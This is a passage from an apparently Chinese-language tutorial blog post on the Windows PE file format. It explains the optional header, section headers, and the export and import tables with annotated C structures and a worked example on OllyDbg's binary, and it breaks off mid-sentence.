class="comment">//说明映像文件应运行于什么样的NT子系统之上</span></span><br><span class="line">    <span class="comment">//该值用来区分系统驱动文件(*.sys)与普通的可执行文件(*.exe, *.dll)</span></span><br><span class="line">    <span class="comment">//value: 1   含义: Driver文件  tips: 系统驱动(如: ntfs.sys)</span></span><br><span class="line">    <span class="comment">//value: 2   含义: GUI文件  tips: 窗口应用程序(如: notepad.exe)</span></span><br><span class="line">    <span class="comment">//value: 3   含义: CUI文件     tips: 控制台应用程序(如: cmd.exe)</span></span><br><span class="line">    <span class="number">0002</span>   </span><br><span class="line">            </span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    <span class="comment">//DLL的文件属性 如果是DLL文件，何时调用DLL文件的入口点</span></span><br><span class="line">    <span class="comment">//一般的exe文件有以下2个属性:</span></span><br><span class="line">    <span class="comment">//IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE(表示支</span></span><br><span class="line">    <span class="comment">//持终端服务器)8000h  IMAGE_DLLCHARACTERISTICS_NX_COMPAT</span></span><br><span class="line">    <span class="comment">//(表示程序采用了)/NXCOMPAT编译100h  (bit or 为 81000)</span></span><br><span class="line">    <span class="comment">//但是开启了ASLR的程序会多一个</span></span><br><span class="line">    <span class="comment">//IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE(DLL can move)</span></span><br><span class="line">    <span class="comment">//40h的属性  (bit or 后为8140),那可以修改这里关闭ASLR</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">         </span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    <span class="comment">//保留栈的大小 默认是1MB</span></span><br><span class="line">    <span class="number">00100000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    <span class="comment">//初始时指定栈大小 默认是4KB</span></span><br><span class="line">    <span class="number">00020000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    <span class="comment">//保留堆的大小 默认是1MB</span></span><br><span class="line">    <span class="number">01000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    <span class="comment">//指定堆大小 默认是4K</span></span><br><span class="line">    <span class="number">00001000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    <span class="comment">//看到的资料都是保留 value 为 0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    <span class="comment">//数据目录的项数, 即指出了我们下面一个成员数组的个数</span></span><br><span class="line">    <span class="comment">//虽然宏定义了#defineIMAGE_NUMBEROF_DIRECTORY_ENTRIES16</span></span><br><span class="line">    <span class="comment">//但是PE装载器会通过此值来识别数组大小,说明数组大小也可能非16</span></span><br><span class="line">    <span class="number">00000010</span>   </span><br><span class="line">       </span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; </span><br><span class="line">    <span class="comment">//很重要，一个数据目录，数组中的每一项记录了对于数据项的RVA及Size</span></span><br><span class="line">    <span class="comment">//重点:  EXPORT IMPORT, RESOURCE, TLS Direction</span></span><br><span class="line"> </span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200509154933553-1590826622691.png" alt="image-20200509154933553"></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// 输出表(导入表) (重要)</span></span></span><br><span class="line">RVA:<span class="number">0010F</span>000 Size:<span class="number">000012F</span>A </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// 输入表 (重要)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// 资源目录 (重要)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// 异常目录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// 安全目录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// 基址重定位表 (重要)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// 调试目录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   <span class="comment">// 描述信息(版权信息之类)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    8   <span class="comment">// 架构特定数据</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       9   <span class="comment">// 机器值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS            10   <span class="comment">// 线程级局部存储目录(重要)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    11   <span class="comment">// 载入配置目录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   12   <span class="comment">// 绑定输入目录 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            13   <span class="comment">// 输入地址表</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   14   <span class="comment">// 延迟加载导入描述符</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 15   <span class="comment">// COM运行时描述符</span></span></span><br></pre></td></tr></table></figure><blockquote><p>PE文件中的code(代码), data(数据), resource(资源)等按照属性分类储存在不同的节区, (1)这样分类便于统一和查看  (2)这样可以在一定程度上保护程序的安全性, 因为如果把所有的代码数据放在一起的话, 当我们向数据区写数据时, 若输入超过缓冲区的大小, 那么就有可能会将其下的code(指令)覆盖掉, 造成应用程序崩溃. PE文件就可以把相似属性的的数据保存在一个被称为”节区”的地方, 然后为每个节区设置不同的特性,访问权限等.                                                                              </p></blockquote><h2 id="0x4-节区头"><a href="#0x4-节区头" class="headerlink" title="0x4 节区头"></a>0x4 节区头</h2><p><strong>节区头是由IMAGE_SECTION_HEADER结构体组成的数组, 每个结构体对应一个节区</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME      8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    BYTE NAME[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="comment">//节区的名字 8个字节</span></span><br><span class="line">    <span class="comment">//如果所有的8字节都被用光，该字符串就没有0结束符，</span></span><br><span class="line">    <span class="comment">//典型的名称.data .text .bss 形式 (.不是必须)</span></span><br><span class="line">    <span class="comment">//节区名称都和节中的内容不一定相关,</span></span><br><span class="line">    <span class="comment">//节名称没有严格要求前边带有“$”的相同名字的区块在载入时候将会被合并，</span></span><br><span class="line">    <span class="comment">//在并，在合并之后的区块中，他们是照“$”后边的字符的字母顺序进行合并的。</span></span><br><span class="line">    <span class="comment">//每个区块的名称都是唯一的，不能有同名的两个区块</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        DOWORD PhysicalAddress; </span><br><span class="line">        DOWORD VitualSize; </span><br><span class="line">    <span class="comment">//内存中节区所占大小(实际初始了的数据大小, 未内存对齐)</span></span><br><span class="line">   </span><br><span class="line">    &#125;Misc;</span><br><span class="line">    </span><br><span class="line">    DWORD VirtualAddress; </span><br><span class="line">    <span class="comment">//内存中节区的起始地址(RVA). 开始没有值, 由SectionAlignment确定</span></span><br><span class="line">    </span><br><span class="line">    DWORD SizeofRawData; </span><br><span class="line">    <span class="comment">//磁盘文件中节区所占大小(对齐后的大小)</span></span><br><span class="line">    </span><br><span class="line">    DWORD PointerToRawData; </span><br><span class="line">    <span class="comment">//磁盘文件中节区的起始位置. 开始没有值, 由FileAlignment确定</span></span><br><span class="line">    </span><br><span class="line">    DWORD PointerToRelocations; </span><br><span class="line">    <span class="comment">//重定位指针  下面四个都是用于目标文件的信息</span></span><br><span class="line">        </span><br><span class="line">    DWORD PointerToLinenumbers; </span><br><span class="line">    <span class="comment">//行数指针</span></span><br><span class="line">        </span><br><span class="line">    WORD NumberOfRelocations; </span><br><span class="line">    <span class="comment">//重定位数</span></span><br><span class="line">    </span><br><span class="line">    WORD NumberOfLinenumbers; </span><br><span class="line">    <span class="comment">//行数</span></span><br><span class="line">    </span><br><span class="line">    DWORD Characteristics; </span><br><span class="line">    <span class="comment">//指定节的属性,权限. 由不同的值 bit or 而成 </span></span><br><span class="line">    <span class="comment">//0x20: 包含代码.           0x40: 包含初始化数据的节</span></span><br><span class="line">    <span class="comment">//0x80: 包含未初始化数据的节  0x20000000: 可执行 (x)</span></span><br><span class="line">    <span class="comment">//0x40000000: 可读 (r)     0x80000000: 可写 (w)</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>  <strong>下图展示OD程序的各个节, 并将(.txt)节中的各成员值在上面依次标出</strong>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200509170302585-1590826622691.png" alt="image-20200509170302585"></p><blockquote><p>由于每个节区都有内存地址到文件偏移间的映射(RAW-RVA). 我们可以通过节区的VirtualAddress与PointerToRawData来从RVA-&gt;RAW. </p><p>注: 由于VirtualSize是未对齐的大小,而SizeofRawData是对齐后的大小, 那么 VirtualAddress一般比SizeofRawData小.  但是也有例外, 就是当含有未初始化数据的节(如.bss), 在磁盘中未初始化数据是不占空间的, 但是到了内存, 未初始化的数据是要赋值占空间.</p></blockquote><hr><h2 id="0x5-IMAGE-EXPORT-DIRECTORY-输出表"><a href="#0x5-IMAGE-EXPORT-DIRECTORY-输出表" class="headerlink" title="0x5 IMAGE_EXPORT_DIRECTORY 输出表"></a>0x5 IMAGE_EXPORT_DIRECTORY 输出表</h2><p><strong>一般dll文件才有,DataDirectory[0]记录了RVA及Size.</strong></p><p><strong>用来描述模块（dll）中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中,从      库向其他PE文件提供服务</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    <span class="comment">//通常为0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    <span class="comment">//创建时间, 不是很有效的值</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    <span class="comment">//主版本号</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    <span class="comment">//小版本号</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Name;</span><br><span class="line">    <span class="comment">//指向以0结尾的ASCII字符串(DLL名称)的RVA</span></span><br><span class="line">    <span class="comment">//如(user32.dll, kernel32.dll)</span></span><br><span class="line">    <span class="number">0010F</span>780</span><br><span class="line">    </span><br><span class="line">    DWORD   Base;</span><br><span class="line">    <span class="comment">//基址, 一个输出项的序数就是函数地址数组中的索引值加base.</span></span><br><span class="line">    <span class="comment">//base大多时候为1 , 说明第一个输出函数的序数为1</span></span><br><span class="line">    <span class="number">00000001</span></span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    <span class="comment">//实际Export函数的个数</span></span><br><span class="line">    <span class="number">000000B</span>C</span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    <span class="comment">//Export函数中具名的函数个数(以名称来输出函数的数量)</span></span><br><span class="line">    <span class="number">000000B</span>C</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfFunctions;</span><br><span class="line">    <span class="comment">//Export函数地址数组(数组个数: NumberOfFunctions)</span></span><br><span class="line">    <span class="number">0010F</span>028</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfNames;</span><br><span class="line">    <span class="comment">//Export函数名称地址数组(数组个数:NumberOfNames)</span></span><br><span class="line">    <span class="number">0010F</span>318</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfNameOrdinals;</span><br><span class="line">    <span class="comment">//指向函数名名称对应序数输出条目列表的RVA</span></span><br><span class="line">    <span class="comment">//数组每个名称拥有一个相应的序数(数组个数:NumberOfNames)</span></span><br><span class="line">    <span class="number">0010F</span>608</span><br><span class="line">    </span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><blockquote><p><strong>从导出表中获得函数地址的API为: GetProcAddress()函数. 该API用来引用EAT来获取指定的API的地址.</strong></p><p><strong>注: (1) 导出函数也可能没有名称的, 这时只能通过序数导出 (2) 序数是指定某个输出函数的独一无二的16位数字(2个字节)</strong></p><p>两种导出函数的方法:</p><p><strong>一:按函数名字</strong></p><p>​      <strong>(1)通过AddressOfNames找到函数名称数组.  使用strcmp()函数, 在(RVA)指针数组从索引值0开始依次与我们要找的函数名称对比,从而找到索引值 index_name</strong></p><p>​      <strong>(2)通过AddressOfNameOrdinals找到存放函数序号的数组, 使用步骤(1)获得的index_name为索引值找到函数地址的序号(index_address)</strong></p><p>​      <strong>(3)通过AddressOfFunctions找到函数地址数组(EAT), 在EAT中使用步骤(2)获得的index_address为索引值找到指定函数的RVA</strong></p><p><strong>二:按函数序号</strong></p><p>​      <strong>(1)使用我们函数的序号减去 _IMAGE_EXPORT_DIRECTORY.Base 的值得到函数地址索引值index_address</strong></p><p>​      <strong>(2)通过AddressOfFunctions找到函数地址数组(EAT), 在EAT中使用步骤(1)获得的index_address为索引值找到指定函数的RVA</strong></p></blockquote><p>  <strong>下面依旧用OD程序来看导出表, 并将每个值标在上面每个成员下面,  通过上面IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]介绍,  已经标出导出表的RVA: 0010F000  Size: 000012FA</strong>. 再通过CFF Explorer 工具查看每个节的地址可以计算出输出表的 RAW :  <strong>00CE200</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510143001536-1590826622691.png" alt="image-20200510143001536"></p><p>  1.查看输出表名称(<strong>RVA : 0010F780 -&gt; RAW: 000CE980</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510151725862-1590826622691.png" alt="image-20200510151725862"></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510151945596-1590826622691.png" alt="image-20200510151945596"></p><p>  2.查找函数名称.</p><p>   (1)<strong>AddressOfNames</strong>. (<strong>RVA: 0010F318 -&gt; RAW: 000CE518</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510153257760-1590826622691.png" alt="image-20200510153257760"></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510154247725-1590826622691.png" alt="image-20200510154247725"></p><p>  由(<strong>RVA:0010F78C -&gt; RAW: 000CE98C</strong>):</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510154722496-1590826622691.png" alt="image-20200510154722496"></p><p>  现在已经找到了函数的名称, 下面模拟查看一个指定名称函数的RVA. 假设我们找的是<strong>Addsorteddata.</strong>(即第一个函数), (1)通过strcmp(). 得到它的索引值是0, 记为 index_name.  (2)通过AddressOfNameOrdinals使用index_name找到函数的序数, 通过下图得到序数0, 记为index_address.</p><p>  <strong>AddressOfNameOrdinals</strong>.  (<strong>RVA: 0010F608 -&gt; RAW: 000CE808</strong>):<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510160635396-1590826622691.png" alt="image-20200510160635396"></p><p>  (3)通过AddressOfFunctions函数地址数组(EAT), 使用index_address为索引值得到我们指定函数的RVA.</p><p>   AddressOfFunctions(<strong>RVA: 0010F028 -&gt; RAW: 000CE228</strong>):<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510161225077-1590826622691.png" alt="image-20200510161225077"></p><p>  到此, 得到我们指定输出函数<strong>Addsorteddata.</strong>的RVA: <strong>00054EFC</strong>. 最后通过 OD载入OD看一下.<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510161939914-1590826622691.png" alt="image-20200510161939914"></p><p>  <strong>从这里也说明了, .exe文件也是可能有输出表的</strong></p><hr><h2 id="0x6-IMAGE-IMPORT-DESCRIPTOP-输入表"><a href="#0x6-IMAGE-IMPORT-DESCRIPTOP-输入表" class="headerlink" title="0x6 IMAGE_IMPORT_DESCRIPTOP 输入表"></a>0x6 IMAGE_IMPORT_DESCRIPTOP 输入表</h2><p><strong>记录PE文件要导入那些库文件  DataDirectory[1]记录了RVA及Size.</strong></p><p><strong>首先, 执行一个程序会有很多的函数是公用的,在动态链接库里(动态链接库, .dll文件总是附加在一个要执行的程序中, .dll文件中有说明库EAT的输出表), 如下图, 一个程序加载的部分 .dll文件.</strong><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200518132004979-1590826622691.png" alt="image-20200518132004979"></p><p><strong>我们的输入表记录了需要用到的函数名称, 通过在加载的动态链接库中搜索该函数得到实际的RVA, 再记录到输入表中, 供程序使用.   另外执行一个普通的程序一般需要多个库, 那导入多少库, 就会有多少个输入表结构体. 这就构成了结构体数组且结构体数组最后以 NULL 结束 (即每个导入的 DLL 都会成为数组中的一项).</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics</span><br><span class="line">    <span class="comment">// 由于是一个联合, 如果这是该结构体数组的最后一</span></span><br><span class="line">    <span class="comment">// 项, 那使用 Characteristics成员,且值为 0</span></span><br><span class="line">    <span class="comment">// 否则使用下面一个成员</span></span><br><span class="line">        </span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    <span class="comment">// INT(import name table)结构体数组的RVA</span></span><br><span class="line">    <span class="comment">// 数组每个成员记录了要使用函数名称与序号</span></span><br><span class="line">        </span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    </span><br><span class="line">    DWORD   TimeDateStamp;                  </span><br><span class="line">    <span class="comment">// 映象绑定前，这个值是0，绑定后是导入模块的时间戳</span></span><br><span class="line">    <span class="comment">// 据说可以用来确定输入表是否绑定从而是否需要重定位</span></span><br><span class="line"> </span><br><span class="line">    DWORD   ForwarderChain;                 </span><br><span class="line">    <span class="comment">// 中转链, 输入函数列表中第一个中转的、32位的索引</span></span><br><span class="line">    <span class="comment">// 如果没有转发链, 值为 -1</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Name;</span><br><span class="line">    <span class="comment">// DLL文件的名称（0结尾的ASCII码字符串）的32位的RVA, </span></span><br><span class="line">    <span class="comment">// 所以一个导入模块对应一个这样的数组</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">    <span class="comment">//IAT(import address table)结构体数组的RVA</span></span><br><span class="line">    </span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上面的 OriginalFirstThunk(INT), FirstThunk(IAT) 成员在PE文件加载前一般是都同时指向相同地址的 IMAGE_THUNK_DATA 数组.下面是 IMAGE_THUNK_DATA32的定义</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//一个联合, 所以意味着每次只能使用一个成员</span></span><br><span class="line">    <span class="keyword">union</span> </span><br><span class="line">    &#123;</span><br><span class="line">        DWORD ForwarderString;</span><br><span class="line">        <span class="comment">// 中转链,一个DLL文件能输出不定义在本DLL文件中却需从另一个</span></span><br><span class="line">        <span class="comment">// DLL文件中的函数.</span></span><br><span class="line">        </span><br><span class="line">        DWORD Function;</span><br><span class="line">        <span class="comment">// 函数的地址</span></span><br><span class="line">        </span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        <span class="comment">// 函数的序数. 由于所有成员都是同一个地址, 当最高位为1时表</span></span><br><span class="line">        <span class="comment">// 示列表中没有函数的名字信息, 只能通过本序数查找函数,</span></span><br><span class="line">        <span class="comment">// 用低16位表示的序数, 因为最高位作为标志了。</span></span><br><span class="line">        </span><br><span class="line">        DWORD AddressOfData;</span><br><span class="line">        <span class="comment">// 同上, 由于所有成员都是同一个地址, 当最高位为0时, 则使用</span></span><br><span class="line">        <span class="comment">// 本成员,用低31为表示 _IMAGE_IMPORT_BY_NAME结构的RVA</span></span><br><span class="line">        </span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上面介绍的 AddressOfData成员的低<span class="number">31</span>就记录指向下面所示的 _IMAGE_IMPORT_BY_NAME 结构体数组的地址(RVA), 数组中每个成员的前<span class="number">2</span>个字节是函数的序数, 后面跟着长度不定的函数名称的字符串.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD Hint;</span><br><span class="line">    <span class="comment">// 函数的序数(即索引, 与输出表中讲的一样)</span></span><br><span class="line">    BYTE Name[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 函数名称数组,记录函数的名称. 数量未定义即长度不定.</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p><strong>注: 上面所讲的 OriginalFirstThunk 成员(指针数组)的值是不能改写的, 通过它寻找函数的名称.   而 FirstThunk 成员(指针数组)的值在PE文件在被PE装载器时, PE装载器会通过 OriginalFirstThunk 得到函数的名称或者序数, 然后通过函数名称在加载的.dll文件的输出表中找到函数的实际地址, 然后替换到FirstThunk的一个值.  装载完成后,  FirstThunk 数组就指向向了函数实际的地址.</strong>  另外上面的 <strong>TimeDateStamp</strong> 成员可以用来确定输入表是否绑定从而是否需要重定位, 如果它的值是0, 那么输入列表没有被绑定, 加载器总是要修复输入表.  否则输入被绑定, 但该时间戳的值必须和.dll文件头中 <strong>TimeDateStamp</strong> 的一样, 如果不一样, 仍会修正输入表, 就会进行下面的步骤.</p><blockquote><p><strong>导入函数输入到 IAT 的顺序</strong>  </p><p><strong>1.读取 _IMAGE_IMPORT_DESCRIPTOR中的name成员, 获取库名称字符串. 如(user32.dll)</strong></p><p><strong>2.装载相应的库. LoadLibrary(“user32.dll”)</strong></p><p><strong>3.读取_IMAGE_IMPORT_DESCRIPTOR中的 OriginalFirstThunk 成员, 得到 INT地址.</strong></p><p><strong>4.逐一读取 INT中数组的值, 获取相应的 IMAGE_IMPORT_BY_NAME地址(RVA)</strong></p><p><strong>5.使用 IMAGE_IMPORT_BY_NAME的Hint (ordinak/序数)或name项, 获取相应函数的起始地址.</strong> </p><p><strong>GetProcAddress(“函数名称”)</strong></p><p><strong>6.读取 IAT 成员, 获得IAT地址.</strong></p><p><strong>7.将上面获得的函数地址输入相应的IAT数组值.</strong></p></blockquote><blockquote><p><strong>8.重复 步骤 4 -7, 直到INT结束.</strong></p></blockquote><p>  <strong>图示一下, INT 与 IAT 关系 (技术太差了.png).</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519174651226-1590826622691.png" alt="image-20200519174651226"></p><p>  <strong>下面实例查看OD程序的输入表.</strong></p><p>  1.首先从PE文件可选头的 DataDirectory[1].VirtualAdress 得到输入表的RVA: <strong>10D000h</strong> 及size: 